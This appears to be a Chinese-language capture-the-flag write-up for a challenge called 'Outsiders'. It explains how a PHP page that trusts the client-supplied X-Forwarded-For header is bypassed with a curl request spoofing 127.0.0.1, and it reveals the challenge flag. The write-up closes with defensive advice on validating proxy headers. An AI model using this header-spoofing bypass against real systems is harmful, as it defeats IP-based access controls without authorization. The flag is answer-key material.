# Outsiders

## 题目简述

页面只向来源 IP 为 `127.0.0.1` 的请求返回 flag。应用优先读取客户端可控的 `X-Forwarded-For` 请求头，并在该请求头不存在时才使用 Web 服务器提供的真实对端地址：

```php
if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
    $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
} else {
    $ip = $_SERVER["REMOTE_ADDR"];
}
```

由于没有可信反向代理负责覆盖和验证该头，外部用户可以直接伪造本地来源。

## 解题过程

权限判断是一次普通字符串比较：

```php
if ($ip == "127.0.0.1") {
    echo "N0PS{XF0rw4Rd3D}";
}
```

向目标发送自定义请求头：

```bash
curl 'http://TARGET/' \
  -H 'X-Forwarded-For: 127.0.0.1'
```

PHP 将它映射为 `$_SERVER["HTTP_X_FORWARDED_FOR"]`，程序把 `$ip` 设为攻击者给出的 `127.0.0.1`，从而绕过“仅本机可见”的检查并返回：

```text
N0PS{XF0rw4Rd3D}
```

`X-Forwarded-For` 的正常语义是由受信任代理记录原始客户端地址；它不是客户端身份凭据。原官方材料中的外链格式错误，而且本题所需语义已在正文说明，因此不保留该链接。

## 方法总结

- 核心技巧：伪造 `X-Forwarded-For: 127.0.0.1`，让应用把外部请求误判为本地请求。
- 识别信号：访问控制依赖转发头，应用未验证请求是否确实来自受信任代理。
- 复用要点：只有明确位于可信代理之后时，应用才能按既定代理链规则解析转发头；否则应使用连接层的对端地址。即使来源 IP 可信，也不应单独承担高价值身份认证。
